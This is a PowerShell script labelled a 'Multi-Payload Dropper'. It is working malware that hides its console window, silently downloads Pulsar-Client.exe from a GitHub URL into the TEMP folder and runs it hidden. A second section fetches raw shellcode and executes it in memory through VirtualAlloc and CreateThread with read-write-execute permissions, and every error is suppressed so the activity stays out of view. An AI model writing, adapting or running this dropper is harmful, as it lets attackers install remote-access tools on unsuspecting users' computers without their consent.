<#
.SYNOPSIS
    Generated Multi-Payload Dropper.
#>
# Hide Console Window immediately
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
try {
    $w = Add-Type -MemberDefinition $t -Name "Win32ShowWindow" -Namespace Win32Functions -PassThru
    $w::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
} catch {}

# --- Configuration ---
$ExeUrls = @(
    "https://github.com/hadrian420/file/blob/main/Pulsar-Client.exe"
)

$BinUrls = @(

)

$DestDir = $env:TEMP
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# --- 1. Execute EXEs ---
foreach ($Url in $ExeUrls) {
    if ($Url -ne "") {
        try {
            $Name = [System.IO.Path]::GetFileName($Url)
            if (-not $Name) { $Name = "update_" + (Get-Random) + ".exe" }
            $ExePath = Join-Path $DestDir $Name
            
            # Download
            (New-Object System.Net.WebClient).DownloadFile($Url, $ExePath)
            
            # Execute Hidden
            Start-Process -FilePath $ExePath -WindowStyle Hidden
        } catch {}
    }
}

# --- 2. Execute BINs ---
if ($BinUrls.Count -gt 0) {
    # Define Kernel32 once
    $Kernel32 = @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@
    if (-not ([System.Management.Automation.PSTypeName]'Kernel32').Type) { Add-Type -TypeDefinition $Kernel32 }
    
    foreach ($Url in $BinUrls) {
        if ($Url -ne "") {
            try {
                $bytes = (New-Object System.Net.WebClient).DownloadData($Url)
                if ($bytes.Length -gt 0) {
                    $ptr = [Kernel32]::VirtualAlloc([IntPtr]::Zero, [uint32]$bytes.Length, 0x3000, 0x40)
                    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
                    $hThread = [Kernel32]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
                    # We do NOT wait for shellcode threads in a loop, or it blocks the next one.
                    # Unless you want serial execution. Here we fire and forget (parallel-ish).
                }
            } catch {}
        }
    }
}